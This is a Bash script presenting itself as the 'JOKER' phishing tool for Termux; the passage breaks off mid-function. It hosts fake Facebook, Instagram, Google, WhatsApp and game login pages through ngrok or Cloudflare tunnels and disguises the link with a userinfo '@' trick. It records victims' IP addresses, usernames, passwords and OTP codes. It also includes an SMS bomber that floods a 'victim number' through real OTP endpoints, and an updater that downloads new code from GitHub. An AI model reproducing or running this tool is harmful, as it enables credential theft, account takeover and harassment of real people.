#!/bin/bash



##   JOKER      :       Phishing Tool
##   Author     :       SUKHDEVR898
##   Version    :       2.3
##   Github     :       https://github.com/sukhdevr898

## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022 SUKHDEVR898 (https://github.com/sukhdevr898)
##


clear



##############################
sites="https://github.com/sukhdevr898/joker/raw/Pass/sites.zip"
bash="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/joker.sh"
msg="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/msg"
page="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/update2.3"

connect="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/msg"



update(){
#mpv updating.wav > /dev/null 2>1&
echo -e "\e[98m\t\t\t PLEASE WAIT.....!" | pv -qL 10
echo -e "\e[98m\t\t\t  UPDATE CHECKING.....!" | pv -qL 10

sleep 5.0
wget -q --spider $page
if [ $? -eq 0 ];
then 


mpv m/updated.wav  > /dev/null 2>1&
echo -e "\e[96m\t\t\t" | pv -qL 10
echo -e "\e[96m\t\t\t     PAGE ARLEADY UPDATED    [✓]               " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10

sleep 3.0
clear
choose
option
else 
mpv /data/data/com.termux/files/usr/bin/m/error.mp3 > /dev/null 2>1&
mpv /data/data/com.termux/files/usr/bin/m/updating.wav > /dev/null 2>1&
echo -e "\e[96m\t\t\t " | pv -qL 10  
echo -e "\e[96m\t\t\t     UPDATE AVAILABLE  [×]                             " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10
wget $msg > /dev/null 2>&1
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   $( cat msg.txt )   !      \e[0m'
rm msg.txt
echo -e "\e[96m\t\t\t              UPDATING....!                            " | pv -qL 10

echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 10
wget $bash
wget $sites
unzip sites.zip

rm sites.zip
echo -e "\e[96m\t\t\t            RESTART TOOL  FOR APPLY UPDATES        " 
exit 0
exit 1
fi
}
flare(){
#mpv /data/data/com.termux/files/usr/bin/Joker/m/flare.wav > /dev/null 2>1&
#echo -e "\e[96m        |=====================================================|" | pv -qL 150
#echo -e "\e[96m                              CLOUDFLARED SERVER             " | pv -qL 150
#echo -e "\e[96m                 copy this command =>(  flare   )            " | pv -qL 150
#echo -e "\e[96m             OPEN NEW SESSION AND RUN ABOVE COMMAND          " | pv -qL 150
#echo -e "\e[96m        |=====================================================|" | pv -qL 150

                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   CLOUDFLARED  STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'


echo -e "\n\n"
#echo -e "\e[96m        |=====================================================|"
#cloudflared  --url localhost:8080  --logfile cld.log > /dev/null 2>&1 &
#link=$( grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log" | tail -1  )
#link=$(tail -1 link txt |  head -1)

cloudflared  tunnel -url localhost:8080  --logfile cld.log > /dev/null 2>&1 &

echo "1"

sleep 3
  grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log" >> link
echo -e "\n"

echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m ! ENTER OFFICIAL SITE  LINK       \e[0m'
echo ""
read -p " ENTER HERE : " url1

echo ""

echo -e "\e[1;91m UNMODIFIED LINK  : \e[0m\e[1;93m $(cat link ) \e[0m  "
echo -e ""

url=$(cat link | grep -o '[-0-9a-z]*\.trycloudflare.com' "link" )
echo -e " MODIFIED LINK :  https://$url1@$url "
rm cld.log link

}
local(){

php -S localhost:8080 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|" | pv -qL 150
echo -e "\e[96m              [\e[92m1\e[96m]==> NGROK                       " | pv -qL 150
echo -e "\e[96m              [\e[92m2\e[96m]==> CLOUDFLARE                  " | pv -qL 150
echo -e "\e[96m        |=====================================================|" | pv -qL 150
read -p "CHOOSE SERVER : " flare
if [ $flare == 1 ];
then 
ngrok

elif [ $flare == 2 ];
then 
flare
fi
}

link(){
if [ -e link.txt ];
then
rm link.txt
fi
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt



}
ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT " | pv -qL 20
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... " | pv -qL 20
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... " | pv -qL 20

ngrok http 8080 > /dev/null 2>1&
sleep 5.0
cd /data/data/com.termux/files/usr/bin/Joker/.sites/$url
link

echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}
ip(){

if [ -e ip.txt ];
then 
mpv /data/data/com.termux/files/usr/bin/Joker/m/cap.mp3 > /dev/null 2>1&
#|mpv datacap.wav > /dev/null 2>1&
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃" | pv -qL 100
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
echo -e "\n"
cat ip.txt | pv -qL 100
rm ip.txt
echo -e "\n"
fi
}




speed(){
clear

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃           SUKHDEVR898                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

curl https://ipinfo.io/ip > Ip.txt 2> /dev/null

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m YOUR IP ADDRESS : $(cat Ip.txt)                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm Ip.txt



echo -e "\e[94m\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

             speedtest
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m             ━━━━━━DONE━━━━━━━ "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
}


############################

banner(){


#mpv /sdcard/Music/start.mp3 > /dev/null 2>1&
echo -e "\e[1;97m $(cat banner.txt)" | pv -qL 130
echo ""
clear
}


unuse(){


wget -q --spider https://raw.githubusercontent.com/sukhdevr898/joker/main/update2.2

while true ;
do
if [ $? -eq 0 ];
then 
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CONNECTING....[!] " | pv -qL 10
echo -e "\e[96m\t\t\t\n\n"
echo -e "\e[96m\n\t\t\t |========= NOW  YOU ARE CONNECTED WITH SERVER ✓    ===|" | pv -qL 10
else 
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     NOT CONNECTED [×]                                 " | pv -qL 20
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CHECK INTERNET CONNECTION OTHERWISE               " | pv -qL 20
echo -e "\e[96m\t\t\t |  THIS TOOL REMOVED BY SUKHDEVR898 YOU CAN'T USE      " | pv -qL 20
echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 20
 sleep 2.0
 
fi
done
clear
}
#banner
sbomb(){
clear
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------WELCOME TO SMS BOMBER -------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               NOTE :- NO NEED TO ENTER COUNTARY CODE                     "
echo -e "\e[96m               UNLIMITED BOMBER ✓                 "
echo -e "\e[96m                               "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |--------------ENTER VICTIM NUMBER -------------------|"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\n\n"
mpv /data/data/com.termux/files/usr/bin/m/number.wav > /dev/null 2>1&
read -p "  ENTER  MOBILE NUMBER : " mobile

count="0"


if [ $mobile == "9352037092" ];
then
mpv /data/data/com.termux/files/usr/bin/m/error.mp3 > /dev/null 2>1&

echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                   ADMIN'S NUMBER NOT ALLOWED "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\n\n"
sleep 5.0
sbomb
else
while true ;
do
clear
curl -L -s "https://api.mydukaan.io/api/account/seller/sign-in/?mobile=$mobile&country_code=%2B91" > /dev/null 2>&1


let count++
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

sleep 1.0


clear
curl -L -s "http://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=$mobile&newOtp=true&retry=false&channel=web&domainName=www.confirmtkt.com&testparamsp=true" > /dev/null 2>&1

let count++

echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"


sleep 1.0


clear

curl -L -s "https://web.bikry.com/otp/generate?mobile=$mobile&communication=true" > /dev/null 2>&1
let count++



echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

clear

curl -L -s "https://www.justdial.com/functions/whatsappverification.php?mob=$mobile&vcode=&rsend=1&name=sfdty+fhye" > /dev/null 2>&1
let count++



echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"




sleep 1.0
done
fi
}

################functions



game(){
clear
echo -e "\e[96m        |=====================================================|" #| pv -qL 50
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|" #| pv -qL 50
echo -e "\e[96m        |=====================================================|" #| pv -qL 50
echo -e "\e[96m                                                             " #| pv -qL 50
echo -e "\e[96m                                                             " #| pv -qL 50
echo -e "\e[96m               [\e[92m1\e[96m]==> PUBG                       " #| pv -qL 50 
echo -e "\e[96m               [\e[92m2\e[96m]==> FREE FIRE                  " #| pv -qL 50
echo -e "\e[96m                                                             " #| pv -qL 50
echo -e "\e[96m            NOTE : - THIS TOOL ONLY FOR EDUCATIONAL PERPOSE       " #| pv -qL 50
echo -e "\e[96m                                                             " #| pv -qL 50
echo -e "\e[96m        |=====================================================|" #| pv -qL 50
echo -e "\e[96m        |                                                     |" #| pv -qL 50
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|" #| pv -qL 50
echo -e "\e[96m        |                                                     |" #| pv -qL 50
echo -e "\e[96m        |=====================================================|" #| pv -qL 50
 
echo -e "\n"
read -p " CHOOSE A GAME :  " pubg
case $pubg in 
1)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites/pubg/notp
url="pubg/notp"
local


while true;

do
ip

if [ -e gmail.txt ];
then
mpv /data/data/com.termux/files/usr/bin/m/cap.mp3 > /dev/null 2>1&
mpv /data/data/com.termux/files/usr/bin/m/datacap.wav > /dev/null 2>1&

echo -e "\n"
echo -e "\e[98m \n\tGMAIL :  $(cat gmail.txt)  "
cat gmail.txt >> /data/data/com.termux/files/usr/bin/Joker/www/pubg.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m\n\tPASSWORD :  $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/pubgpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&

clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> FF PAGE 1                     "
echo -e "\e[96m               [\e[92m2\e[96m]==> FF PAGE 2                "
echo -e "\e[96m               [\e[92m3\e[96m]==> FF PAGE 3                 "
echo -e "\e[96m               [\e[92m4\e[96m]==> FF PAGE 4                     "
echo -e "\e[96m               [\e[92m5\e[96m]==> FF PAGE 5                     "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |=====================================================|"
cd .sites/
read -p " SELECT ONE :   " ff
if [ $ff == 1 ];
then


cd 1
url="1"
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ff.txt
rm usernames.txt
echo -e "\n"
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done

elif [ $ff == 2 ];
then


cd 2
url="2"
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ff.txt
rm usernames.txt
echo -e "\n"
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done

elif [ $ff == 3 ];
then


cd 3
url="3"
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ff.txt
rm usernames.txt
echo -e "\n"
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
elif [ $ff == 4 ];
then


cd 4
url="4"
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ff.txt
rm usernames.txt
echo -e "\n"
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done

elif [ $ff == 5 ];
then


cd 5
url="5"
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ff.txt
rm usernames.txt
echo -e "\n"
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
else
choose
fi


;;
esac

}


social1(){
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> FACEBOOK                   "
echo -e "\e[96m               [\e[92m2\e[96m]==> INSTAGRAM                  "
echo -e "\e[96m               [\e[92m3\e[96m]==> GOOGLE                     "
echo -e "\e[96m               [\e[92m4\e[96m]==> WHATSAPP                     "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
#echo -e "\e[96m        |===================HACK3R============================|" #| pv -qL 150
#echo -e "\e[96m        |                                                     |" #| pv -qL 150
#echo -e "\e[96m        |                                                     |" #| pv -qL 150
#echo -e "\e[96m        |    NOTE:-  PASSWORD  SAVE IN 'www' DIRECTORY        |" #| pv -qL 150
#echo -e "\e[96m        |                                                     |" #| pv -qL 150
#echo -e "\e[96m        |=====================================================|" #| pv -qL 150

read -p "CHOOSE ATTACK : " OP1



}


social(){

if [ $OP1 == 1 ];

then 
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> FACEBOOK(OTP)              "
echo -e "\e[96m               [\e[92m2\e[96m]==> FB ADVANCE                 "
echo -e "\e[96m               [\e[92m3\e[96m]==> FB SECURITY                "
echo -e "\e[96m               [\e[92m4\e[96m]==> FB MESSENGER               "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK.                     "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " FB
case $FB in
1)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites/
url="facebook"

cd facebook
local 
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/fb.txt
rm usernames.txt 
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fbpass.txt
rm pass.txt
fi
if [ -e otp.txt ];
then

echo -e "\e[98m \nOTP : $(cat otp.txt)  "

echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm otp.txt 

fi
done
;;


2)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites/
url="fb_advanced"
cd fb_advanced
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites/
url="fb_security"

cd fb_security
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites
url="fb_messenger"
 

cd fb_messenger
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  /data/data/com.termux/files/usr/bin/Joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
social1
social
;;
esac
elif [ $OP1 == 2 ];
then 
mpv m/click.mp3 > /dev/null 2>1&
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> INSTAGRAM                  "
echo -e "\e[96m               [\e[92m2\e[96m]==> IG FOLLOWER                "
echo -e "\e[96m               [\e[92m3\e[96m]==> IG FOLLOWERS               "
echo -e "\e[96m               [\e[92m4\e[96m]==> IG BLUE TICK               "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " IG
case $IG in
 
1)
mpv /data/data/com.termux/files/usr/bin/m/click.mp3 > /dev/null 2>1&
cd .sites/
url="instagram"

cd instagram
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
